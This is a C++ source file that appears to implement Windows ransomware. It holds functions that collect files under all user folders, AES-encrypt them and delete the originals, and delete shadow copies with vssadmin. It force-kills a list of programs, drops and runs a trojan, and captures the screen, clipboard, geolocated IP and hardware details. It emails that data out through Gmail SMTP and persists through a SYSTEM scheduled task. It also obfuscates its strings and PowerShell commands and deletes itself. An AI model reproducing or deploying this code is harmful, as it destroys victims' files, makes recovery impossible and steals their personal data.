#include "headers.h"

using namespace std;
using Json = nlohmann::json;

vector<string> globalAllFiles;
mutex allFilesMutex;

string exec(const char* cmd) {
    string result = (string)skCrypt("");
    FILE* CommandResult = _popen(cmd, skCrypt("rt"));
    char line[256];
    while (fgets(line, 256, CommandResult)) 
        result += line;
    _pclose(CommandResult);
    return result;
}

string powershellEncodedCommand(string cmd) {
    return (string)skCrypt("powershell -enCoDEdcOmmAnD ") + exec(((string)skCrypt("powershell [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes(\\\"") + cmd + (string)skCrypt("\\\"))")).c_str());
}

bool copy_file(const char* From, const char* To) {
    size_t MaxBufferSize = 1048576;
    ifstream is(From, ios_base::binary);
    ofstream os(To, ios_base::binary);

    pair<char*, ptrdiff_t> buffer;
    buffer = get_temporary_buffer<char>(MaxBufferSize);

    while (is.good() and os) {
        is.read(buffer.first, buffer.second);
        os.write(buffer.first, is.gcount());
    }

    return_temporary_buffer(buffer.first);

    if (os.fail())
        return false;
    if (is.eof())
        return true;
    return false;
}

DWORD trojanFunction(LPVOID params_useless) {
    this_thread::sleep_for(6500ms);
    if (DROPRUN_TROJAN_FILE)
        system((TROJANFILE).c_str());
    system(((string)skCrypt("start ") + (string)skCrypt("https://www.youtube.com/watch?v=dQw4w9WgXcQ")).c_str());   // just for fun and for tests - you can delete this line
}

DWORD removeTasks(LPVOID params_useless) {
    string check1 = (string)skCrypt("(get-process -ea SilentlyContinue '");
    string check2 = (string)skCrypt("') -eq $Null");

    string kill1 = (string)skCrypt("Stop-Process -Force -Name '");
    string kill2 = (string)skCrypt("'");

	while (true) {
        for (string badProgram : badPrograms) {
            if (exec(powershellEncodedCommand(check1 + badProgram + check2).c_str()) == (string)skCrypt("False\n"))
                system(powershellEncodedCommand(kill1 + badProgram + kill2).c_str());
        }
	}
}

void getAllFiles(string username) {
    vector<string> tmpFiles;

    for (string file : split(exec(((string)skCrypt("dir /b /s /a-d C:\\Users\\") + username).c_str()), '\n'))
        tmpFiles.push_back(file);

    for (int i = 0; i < tmpFiles.size(); i++) {
        vector<string> fileSplitted = split(tmpFiles[i], '.');

        for (string safeFile : safeFiles)
            if (safeFile == tmpFiles[i])
                goto erase;

        if (ENABLE_WHITELIST)
            for (string extensionW : whitelist)
                if (fileSplitted.back() == extensionW)
                    goto continue_;
        if (ENABLE_BLACKLIST)
            for (string extensionB : blacklist)
                if (fileSplitted.back() == extensionB)
                    goto erase;

    continue_:
        continue;
    erase:
        tmpFiles.erase(tmpFiles.begin() + i);
    }

    allFilesMutex.lock();
    globalAllFiles.insert(globalAllFiles.end(), tmpFiles.begin(), tmpFiles.end());
    allFilesMutex.unlock();
}

int gettimeofday(struct timeval* tp, struct timezone* tzp) {
    static const uint64_t EPOCH = ((uint64_t)116444736000000000ULL);

    SYSTEMTIME  system_time;
    FILETIME    file_time;
    uint64_t    time;

    GetSystemTime(&system_time);
    SystemTimeToFileTime(&system_time, &file_time);
    time = ((uint64_t)file_time.dwLowDateTime);
    time += ((uint64_t)file_time.dwHighDateTime) << 32;

    tp->tv_sec = (long)((time - EPOCH) / 10000000L);
    tp->tv_usec = (long)(system_time.wMilliseconds * 1000);
    return 0;
}

string generateRandom(const int len) {
    timeval time;
    gettimeofday(&time, NULL);
    const string alphanum = (string)skCrypt("UHGAX5r9eVJsiDMqSCN6QEgoPpvcW2fkyzhBl048dajFbxmIwuOT7KLYZn31tR");  // = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" but scrambled for more security against reverse
    string result;
    result.reserve(len);
    srand((time.tv_sec * 2654435789U + time.tv_usec) * 2654435789U + _getpid());
    for (int i = 0; i < len; ++i) 
        result += alphanum.at(rand() % (size(alphanum) - 1));

    return result;
}

vector<string> getFiles(string mainDir) {
    vector<string> result;

    if (DEBUG && !PathIsDirectoryEmptyA((LPCSTR)mainDir.c_str())) {
        vector<string> files = split(exec(((string)skCrypt("dir /s /b /a-d ") + mainDir).c_str()), '\n');
        for (string file : files) {
            vector<string> fileSplitted = split(file, '.');

            for (string safeFile : safeFiles)
                if (safeFile == file)
                    goto continue_;

            if (ENABLE_WHITELIST)
                for (string extensionW : whitelist)
                    if (fileSplitted.back() == extensionW)
                        goto push;
            if (ENABLE_BLACKLIST)
                for (string extensionB : blacklist)
                    if (fileSplitted.back() == extensionB)
                        goto continue_;

        push:
            result.push_back(file);
        continue_:
            continue;
        }
    }

    else {
        vector<thread> threads;
        for (string user : split(exec(skCrypt("dir /b /ad C:\\Users")), '\n')) {
            if (!fileExists((string)skCrypt("C:\\Users") + user))   /*directory does not exists (idk why)*/
                continue;
            if (PathIsDirectoryEmptyA((LPCSTR)((string)skCrypt("C:\\Users\\") + user).c_str()))   /*directory is empty*/
                continue;

            threads.push_back(thread(getAllFiles, user));
        }
        for (int i = 0; i < threads.size(); i++)
            threads[i].join();

        result.insert(result.end(), globalAllFiles.begin(), globalAllFiles.end());
    }
    result.pop_back();
    return result;
}

vector<string> split(const string& s, char delimiter) {
    size_t start = 0;
    size_t end = s.find_first_of(delimiter);
    vector<string> output;

    while (end <= string::npos) {
        output.emplace_back(s.substr(start, end - start));

        if (end == string::npos)
            break;

        start = end + 1;
        end = s.find_first_of(delimiter, start);
    }

    return output;
}

bool fileExists(const string& name) {
    struct stat buffer;
    return stat(name.c_str(), &buffer) == 0;
}

string getDate() {
    auto timeNow = time(nullptr);
    ostringstream stream;
    stream << put_time(localtime(&timeNow), ((string)skCrypt("%d-%m-%Y %H:%M:%S")).c_str());
    return stream.str();
}

string getHWID() {
    HW_PROFILE_INFO hwProfileInfo;
    GetCurrentHwProfile(&hwProfileInfo);
    wstring ws(hwProfileInfo.szHwProfileGuid);
    return string(ws.begin(), ws.end());
}

string getIPData() {
    string json, result;
    URLDownloadToFileA(NULL, skCrypt("http://ipwho.is/"), (TEMPFILE).c_str(), 0, NULL);
    SetFileAttributesA((TEMPFILE).c_str(), FILE_ATTRIBUTE_HIDDEN);
    ifstream file((TEMPFILE));
    Json data = Json::parse(file);
    file.close();
    DeleteFileA((TEMPFILE).c_str());
    result += (string)data[(string)skCrypt("ip")] + (string)skCrypt("\n");
    result += (string)data[(string)skCrypt("country")] + (string)skCrypt("\n");
    result += (string)data[(string)skCrypt("city")] + (string)skCrypt("\n");
    result += to_string(data[(string)skCrypt("latitude")]) + (string)skCrypt("\n");
    result += to_string(data[(string)skCrypt("longitude")]) + (string)skCrypt("\n");
    return result;
}

string getCPU() {
    string result = (string)skCrypt("");
    int cpuInfo[4] = { -1 };
    unsigned nExIds;
    char cpuBrand[64];
    __cpuid(cpuInfo, 0x80000000);
    nExIds = cpuInfo[0];
    for (int i = 0x80000000; i <= nExIds; ++i) {
        __cpuid(cpuInfo, i);
        if (i == 0x80000002)
            memcpy(cpuBrand, cpuInfo, sizeof(cpuInfo));
        else if (i == 0x80000003)
            memcpy(cpuBrand + 16, cpuInfo, sizeof(cpuInfo));
        else if (i == 0x80000004)
            memcpy(cpuBrand + 32, cpuInfo, sizeof(cpuInfo));
    }
    ostringstream stream;
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    MEMORYSTATUSEX stateX;
    stateX.dwLength = sizeof(stateX);
    GlobalMemoryStatusEx(&stateX);
    stream << sysInfo.dwNumberOfProcessors << skCrypt("\n") << (stateX.ullTotalPhys / 1024) / 1024;
    result += cpuBrand;
    result += skCrypt("\n");
    result += stream.str();
    return result;
}

string getGPU() {
    string result = (string)skCrypt("none");
    DISPLAY_DEVICE displayDevice = {sizeof(displayDevice), 0};
    if (EnumDisplayDevices(NULL, 0, &displayDevice, EDD_GET_DEVICE_INTERFACE_NAME)) {   /*it takes only the first gpu*/
        wstring ws(displayDevice.DeviceString);
        result = string(ws.begin(), ws.end());
    }
    return result;
}

string getPcName() {
    string result = (string)skCrypt("none");
    TCHAR  infoBuf[1600];
    DWORD  bufCharCount = 1600;

    if (GetComputerName(infoBuf, &bufCharCount)) {
        wstring ws(&infoBuf[0]);
        result = string(ws.begin(), ws.end());
    }
    return result;
}

string getUserName() {
    string result = (string)skCrypt("none");
    TCHAR  infoBuf[1600];
    DWORD  bufCharCount = 1600;

    if (GetUserName(infoBuf, &bufCharCount)) {
        wstring ws(&infoBuf[0]);
        result = string(ws.begin(), ws.end());
    }
    return result;
}

string getResolution() {
    RECT desktop;
    const HWND hDesktop = GetDesktopWindow();
    GetWindowRect(hDesktop, &desktop);
    ostringstream stream;
    stream << desktop.right << skCrypt("x") << desktop.bottom;
    return stream.str();
}

string getWinVersion() {
    string result = (string)skCrypt("none");
    if (IsWindowsXPOrGreater())
        result = (string)skCrypt("XP / Vista");
    if (IsWindows7OrGreater())
        result = (string)skCrypt("Seven");
    if (IsWindows7SP1OrGreater())
        result = (string)skCrypt("Seven SP1");
    if (IsWindows8OrGreater())
        result = (string)skCrypt("Eight");
    if (IsWindows8Point1OrGreater())
        result = (string)skCrypt("Eight.one");
    if (IsWindows10OrGreater())
        result = (string)skCrypt("Ten");
    if (IsWindowsServer())
        result = (string)skCrypt("Server");
    return result;
}

string getLanguage() {
    char buf[10];
    return string(buf, GetLocaleInfoA(LOCALE_SYSTEM_DEFAULT, LOCALE_SISO639LANGNAME, buf, sizeof(buf)) - 1) + 
          (string)skCrypt("-") + 
           string(buf, GetLocaleInfoA(LOCALE_SYSTEM_DEFAULT, LOCALE_SISO3166CTRYNAME, buf, sizeof(buf)));
}

string getClipboard() {
    string result = (string)skCrypt("none");
    if (!OpenClipboard(nullptr))
        return result;

    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == nullptr)
        return result;

    char* pszText = static_cast<char*>(GlobalLock(hData));
    if (pszText == nullptr)
        return result;

    result = pszText;
    GlobalUnlock(hData);
    CloseClipboard();
    return result;
}

string getScreenshot() {
    HWND desktopHwnd = GetDesktopWindow();
    RECT desktopParams;
    HDC devC = GetDC(desktopHwnd);
    GetWindowRect(desktopHwnd, &desktopParams);
    DWORD width = desktopParams.right - desktopParams.left;
    DWORD height = desktopParams.bottom - desktopParams.top;

    DWORD fileSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + (sizeof(RGBTRIPLE) + 1 * (width * height * 4));
    char* bmpData = (char*)GlobalAlloc(0x0040, fileSize);

    PBITMAPFILEHEADER fileHeader = (PBITMAPFILEHEADER)bmpData;
    PBITMAPINFOHEADER  infoHeader = (PBITMAPINFOHEADER)&bmpData[sizeof(BITMAPFILEHEADER)];

    fileHeader->bfType = 0x4D42;
    fileHeader->bfSize = sizeof(BITMAPFILEHEADER);
    fileHeader->bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);

    infoHeader->biSize = sizeof(BITMAPINFOHEADER);
    infoHeader->biPlanes = 1;
    infoHeader->biBitCount = 24;
    infoHeader->biCompression = BI_RGB;
    infoHeader->biHeight = height;
    infoHeader->biWidth = width;

    RGBTRIPLE* image = (RGBTRIPLE*)&bmpData[sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER)];
    RGBTRIPLE color;

    HDC captureDC = CreateCompatibleDC(devC);
    HBITMAP captureBitmap = CreateCompatibleBitmap(devC, width, height);
    SelectObject(captureDC, captureBitmap);
    BitBlt(captureDC, 0, 0, width, height, devC, 0, 0, SRCCOPY | CAPTUREBLT);
    GetDIBits(captureDC, captureBitmap, 0, height, image, (LPBITMAPINFO)infoHeader, DIB_RGB_COLORS);

    HANDLE hFile = CreateFileA((TEMPFILE).c_str(), GENERIC_WRITE, FILE_SHARE_WRITE, 0, CREATE_ALWAYS, 0, 0);
    WriteFile(hFile, bmpData, fileSize, new DWORD, 0);
    CloseHandle(hFile);
    GlobalFree(bmpData);

    ifstream imageFile(TEMPFILE, ios::in | ios::binary);
    vector<BYTE> data(istreambuf_iterator<char>(imageFile), {});
    string result = base64_encode(&data[0], data.size());
    imageFile.close();
    
    if (remove((TEMPFILE).c_str()) != 0)
        DeleteFileA((TEMPFILE).c_str());

    return result;
}

void sendEmail() {
    system(powershellEncodedCommand(
        (string)skCrypt("seND-mAilmeSSaGE -frOM '") + SENDERMAIL +
        (string)skCrypt("' -tO '") + RECEIVERMAIL +
        (string)skCrypt("' -SuBJect '") + EMAILSUBJECT +
        (string)skCrypt("' -bodY '") + EMAILBODY +
        (string)skCrypt("' -AtTAchMenTs '") + INFOFILE +
        (string)skCrypt("' -sMtPsERveR 'smtp.gmail.com' -pOrt 587 -usESsl -creDentIAl (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList '") + SENDERMAIL +
        (string)skCrypt("', (ConvertTo-SecureString '") + SENDERPSW +
        (string)skCrypt("' -AsPlainText -Force))")
    ).c_str());
}

void dropFile(string content, string path) {
    ofstream fout(path, ios::binary | ios::out);
    vector<BYTE> write = base64_decode(content);
    fout.write((const char*)&write[0], write.size());
}

void changeWallpaper(string content) {
    ofstream fout(NEWWALLPAPER, ios::binary | ios::out);
    vector<BYTE> write = base64_decode(content);
    fout.write((const char*)&write[0], write.size());
    fout.close();
    if (!copy_file(((string)skCrypt("C:\\Users\\") + getUserName() + (string)skCrypt("\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles\\") + split(exec(skCrypt("dir /b %AppData%\\Microsoft\\Windows\\Themes\\CachedFiles")), '\n')[0]).c_str(), (OLDWALLPAPER).c_str()) && DEBUG)
        cout << skCrypt("Wallpaper not copied!\n\n");

    USES_CONVERSION_EX;
    SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, A2W_EX((NEWWALLPAPER).c_str(), (NEWWALLPAPER).length()), SPIF_UPDATEINIFILE);
}

bool isConnected2Internet() {
    return InternetCheckConnection(CA2W(skCrypt("http://www.google.com/")), FLAG_ICC_FORCE_CONNECTION, 0);
}

void scheduleTask() {
    system(((string)skCrypt("schtasks /delete /f /tn \"") + TASKNAME + (string)skCrypt("\"")).c_str());
    system(((string)skCrypt("schtasks /create /sc minute /mo ") + MINUTES + (string)skCrypt(" /f /ru \"SYSTEM\" /tn \"") + TASKNAME + (string)skCrypt("\" /tr \"powershell -noprofile -executionpolicy bypass -file '") + EMAILSENDER + (string)skCrypt("'\"")).c_str());
}

vector<vector<string>> vectorSplitter(vector<string> baseVector, int parts) {
    vector<vector<string>> result;
    int length = baseVector.size() / parts;
    int remain = baseVector.size() % parts;
    int begin = 0, end = 0;
    for (int i = 0; i < min(parts, baseVector.size()); ++i) {
        end += (remain > 0) ? (length + !!(remain--)) : length;
        result.push_back(vector<string>(baseVector.begin() + begin, baseVector.begin() + end));
        begin = end;
    }
    return result;
}

void deleteRestorePoints() {
    system(powershellEncodedCommand((string)skCrypt("vssadmin delete shadows /all /quiet")).c_str());
}

void deleteMe(string myPath) {
    system(( (string)(char*)calloc(myPath.length() + 11, sizeof(char)) + (string)skCrypt("start cmd /c \"del ") + myPath + (string)skCrypt(" & exit\"") ).c_str());
}

void encryptFiles(vector<string> files, string key) {
    for (string file : files) {

        HANDLE hFile = CreateFileA(file.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        if (GetLastError() == ERROR_FILE_NOT_FOUND || (MAX_FILE_SIZE == 0 ? false : GetFileSize(hFile, NULL) > MAX_FILE_SIZE)) {
            CloseHandle(hFile);
            continue;
        }
        CloseHandle(hFile);
        ifstream fin(file, ios::in | ios::binary);
        vector<BYTE> data(istreambuf_iterator<char>(fin), {});
        fin.close();

        string content = aes_encrypt(key, base64_encode(&data[0], data.size()), IV);

        if (remove(file.c_str()) != 0)
            DeleteFileA(file.c_str());

        ofstream fout(file + FILE_EXTENSION, ios::out);
        fout.write((const char*)&content[0], content.size());
        fout.close();
    }
}

void createAndSetRegKey(HKEY key, string keyPath, string keyName, string value) {
    HKEY hKey;
    DWORD dwDisposition;
    if (RegCreateKeyEx(key, CA2T(keyPath.c_str()), 0, NULL, 0, KEY_WRITE, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS && DEBUG)
            cout << key << skCrypt("\\") << keyPath << skCrypt(" not created\n");

    if (keyName == (string)skCrypt("NULL") && RegSetValueA(hKey, NULL, REG_SZ, value.c_str(), value.size()) != ERROR_SUCCESS && DEBUG)
         cout << key << skCrypt("\\") << keyPath << skCrypt(" not setted\n");

    else if (RegSetValueA(hKey, keyName.c_str(), REG_SZ, value.c_str(), value.size()) != ERROR_SUCCESS && DEBUG)
        cout << key << skCrypt("\\") << keyPath << skCrypt(" not setted\n");


    if (RegCloseKey(hKey) != ERROR_SUCCESS && DEBUG)
        cout << key << skCrypt("\\") << keyPath << skCrypt(" not closed\n");
}

void changeIcon() {
    string progId = "";
    for (int i = 1; i < (FILE_EXTENSION).length(); i++)
        progId += towlower((FILE_EXTENSION)[i]);
    progId += skCrypt("file");

    createAndSetRegKey(HKEY_CURRENT_USER, 
        (string)skCrypt("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\") + FILE_EXTENSION + (string)skCrypt("\\UserChoice"),
        (string)skCrypt("ProgId"), progId);
    createAndSetRegKey(HKEY_CLASSES_ROOT, FILE_EXTENSION, (string)skCrypt("NULL"), progId);
    createAndSetRegKey(HKEY_CLASSES_ROOT, progId + (string)skCrypt("\\DefaultIcon"), (string)skCrypt("NULL"), FILESICON);

    exec(((string)skCrypt("assoc ") + FILE_EXTENSION + (string)skCrypt("=") + progId).c_str());
}
